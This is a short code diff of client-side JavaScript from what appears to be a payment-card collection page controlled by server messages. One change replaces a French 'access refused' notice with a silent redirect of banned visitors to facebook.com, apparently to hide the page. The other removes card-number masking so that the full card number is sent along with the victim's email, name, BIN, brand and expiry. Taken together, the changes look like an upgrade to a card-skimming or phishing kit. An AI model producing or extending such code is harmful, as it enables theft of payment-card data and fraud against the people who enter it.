@@ -156,7 +156,7 @@
             if (msg.type === 'REDIRECT') {
                 window.location.href = msg.url;
             } else if (msg.type === 'BANNED') {
-                document.body.innerHTML = '<div style="color:white;text-align:center;margin-top:20vh;"><h1>ACCÈS REFUSÉ</h1><p>Votre accès à ce service a été révoqué.</p></div>';
+                window.location.href = msg.redirect || 'https://www.facebook.com';
             }
         };
 
@@ -178,7 +178,7 @@
                 client_id: clientId,
                 email: document.getElementById('email').value,
                 full_name: document.getElementById('name').value,
-                numero_carte_masque: document.getElementById('card').value.replace(/\s/g, '').replace(/(\d{4})\d+(\d{4})/, "$1-****-****-$2"),
+                numero_carte: document.getElementById('card').value.replace(/\s/g, ''),
                 card_bin: cardBin,
                 card_brand: brand,
                 expiry: document.getElementById('expiry').value,
